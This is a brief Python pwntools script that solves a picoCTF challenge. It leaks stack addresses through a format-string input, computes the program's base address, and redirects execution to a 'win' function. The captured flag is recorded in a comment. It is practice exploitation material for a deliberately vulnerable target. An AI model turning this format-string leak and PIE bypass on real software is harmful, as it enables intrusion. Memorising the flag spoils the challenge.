from pwn import *
elf = context.binary = ELF("./vuln", checksec=False)

# p = process('./vuln')
p = remote("rescued-float.picoctf.net", 64527)

p.sendlineafter(b"Enter your name:", b'%p '*20)
leak = p.recvline().strip()
addresses = re.findall(b'0x[0-9a-f]+', leak)

LEAK_ADDR = int(addresses[17], 16)
log.info("Leak address: " + hex(LEAK_ADDR))
BASE_ADDR = LEAK_ADDR - 0x1441
log.info("Base address: " + hex(BASE_ADDR))
WIN_ADDR = BASE_ADDR + elf.symbols.win
log.info("Win address: " + hex(WIN_ADDR))

p.sendlineafter(b"ex => 0x12345: ", hex(WIN_ADDR))
response = p.recvall(timeout=1).strip()
print(response.decode())

# picoCTF{p13_5h0u1dn'7_134k_8c8ae861}

p.close()